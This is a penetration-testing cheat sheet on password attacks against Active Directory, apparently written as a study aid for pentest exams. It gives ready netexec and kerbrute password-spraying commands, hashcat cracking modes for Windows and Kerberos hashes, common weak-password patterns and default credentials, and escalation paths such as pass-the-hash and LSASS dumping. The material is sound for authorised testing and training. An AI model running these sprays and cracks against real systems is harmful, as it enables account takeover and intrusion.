# Password Attacks Battle Card

## What to Check First
```
1. HAVE USERS? → Enumerate via SMB null, LDAP anon, Kerbrute, web
2. HAVE HASHES? → Identify hash type (NTLM, NetNTLMv2, Kerberos, SHA)
3. HAVE POLICY? → rpcclient getdompwinfo, netexec --pass-pol
4. HAVE TARGET PROTOCOL? → SMB, WinRM, SSH, MSSQL, RDP
```

## High-Value Findings
- **Password policy allows weak passwords** → Blank passwords, 1 char, year
- **No lockout policy** → Unlimited brute force (unlimited spray)
- **Common passwords** → SeasonYear!, CompanyName123, P@ssw0rd
- **Password in description field** → LDAP search for description
- **GPP password** → gpp-decrypt → Plaintext domain cred
- **Default creds on web apps** → admin:admin, tomcat:tomcat
- **Password reuse** → Same cred across multiple services/hosts

## Immediate Commands
# Password Policy Enumeration
```
rpcclient -U "" -N target -c "getdompwinfo"
netexec smb target -u user -p pass --pass-pol
```

# Password Spraying (SLOW & CAREFUL - check lockout first)
```
# SMB spray
netexec smb target -u users.txt -p 'SeasonYear1!' --continue-on-success
netexec smb /24 -u users.txt -p 'Password123' --continue-on-success

# WinRM spray
netexec winrm target -u users.txt -p 'Company2024!' --continue-on-success

# Kerberos spray
kerbrute passwordspray -d domain.local --dc target users.txt 'Password123'
```

# Hash Cracking
```
# NTLM (1000)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r rule.rule

# NetNTLMv2 (5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberos 5 TGS-REP (13100)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# AS-REP (18200)
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberos 5 TGS (19600)
hashcat -m 19600 hash.txt /usr/share/wordlists/rockyou.txt
```

# Password Spray Strategy
```
Common patterns to try (1-2 passwords per user, NOT per protocol):
├── SeasonCurrentYear!  → Summer2024!
├── CompanyName123      → ExamCorp123
├── MonthYear!          → October2024!
├── SeasonYear          → Fall2024
├── P@ssw0rd            → Common default base
├── Welcome1            → New account defaults
└── Blank passwords     → Always worth trying
```

## Common Attack Paths
```
LDAP/SMB USERS → Password Policy → Spray 1-2 Passwords → Hits → Shell
AS-REP HASHES → hashcat → Cracked TGT → Domain User
KERBEROAST HASHES → hashcat → Cracked SPN → Lateral
NETNTLMV2 → hashcat → Cracked → Domain/Local User
GPP PASSWORD → Plaintext → Domain Admin (SYSVOL write)
HASH → Pass-the-Hash → Direct Access (no cracking needed)
```

## Escalation Paths
- **Any crackable hash** → Plaintext password → Reuse check
- **Cracked domain user** → BloodHound → DA path
- **Cracked local admin** → LSASS dump → Domain creds
- **Password spray hit** → Test on all services (SMB, WinRM, SSH, MSSQL)
- **Cracked hash** → Check PTH potential before cracking

## When to Stop
- Password policy shows lockout after 5 attempts → 1-2 passwords max
- No creds found after reasonable attempt
- Focus energy on finding more hashes/configs rather than brute force

## Common Mistakes
- Brute forcing without checking lockout policy (locks accounts!)
- Spraying the same password across multiple protocols (same user)
- Not trying common password patterns (season+year, company+123)
- Forgetting to check blank passwords
- Using the same password list for cracking and spraying
- Not running hashcat with rules (need --rules or .rule file)
- Cracking NTLM when you can just PTH (check PTH first!)
- Not testing crackable hashes against other services immediately
